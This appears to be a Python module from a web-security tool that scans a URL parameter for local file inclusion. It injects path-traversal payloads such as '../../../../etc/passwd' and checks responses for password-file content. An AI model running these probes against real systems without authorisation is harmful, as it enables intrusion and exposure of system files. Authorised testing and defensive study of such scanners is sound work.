# fanglfi.py
"""
Basic LFI scanner entrypoints:
 - scan_lfi(url, param, emit, stop_event=None)
 - scan(target, emit, stop_event=None)
"""
import requests
import urllib.parse
import time
import os
from pathlib import Path

def _find_payload_dir():
    here = Path(__file__).resolve().parent
    cand = here / "payloads"
    if cand.exists(): return cand
    cur = here
    for _ in range(6):
        p = cur / "payloads"
        if p.exists(): return p
        p2 = cur / "BloodFANG" / "core" / "payloads"
        if p2.exists(): return p2
        cur = cur.parent
    env = os.getenv("BLOODFANG_PAYLOADS")
    if env:
        p = Path(env)
        if p.exists(): return p
    return cand

PAYLOAD_DIR = _find_payload_dir()

def _load_payloads(name, fallback):
    try:
        f = PAYLOAD_DIR / name
        if f.exists():
            text = f.read_text(encoding="utf-8", errors="ignore")
            lines = [L.strip() for L in text.splitlines() if L.strip() and not L.strip().startswith("#")]
            if lines: return lines
    except Exception:
        pass
    return fallback

PAYLOADS = _load_payloads("lfi_payloads.txt", ["../../../../etc/passwd", "/etc/passwd"])

def _compose(url, param, payload):
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param]
    q.append((param, payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def scan_lfi(url, param, emit, stop_event=None):
    if not url:
        emit("[LFI] Missing URL.")
        return
    if not param:
        emit("[LFI] Missing parameter.")
        return

    emit(f"[LFI] Target: {url} param={param}")
    for payload in PAYLOADS:
        if stop_event is not None and getattr(stop_event, "is_set", lambda: False)():
            emit("[LFI] Stopped by user.")
            return
        t = _compose(url, param, payload)
        try:
            r = requests.get(t, timeout=8, verify=False)
            emit(f"[LFI] {r.status_code} → {t}")
            if "root:x:" in r.text or "passwd" in r.text:
                emit(f"[LFI] Possible inclusion content detected for payload: {payload}")
        except requests.exceptions.RequestException as re:
            emit(f"[LFI] Request error: {re}")
        except Exception as e:
            emit(f"[LFI] Unexpected error: {e}")
        time.sleep(0.3)
    emit("[LFI] Complete.")

def scan(target, emit, stop_event=None):
    url, param = (target.split("::", 1) + [""])[:2]
    scan_lfi(url, param, emit, stop_event)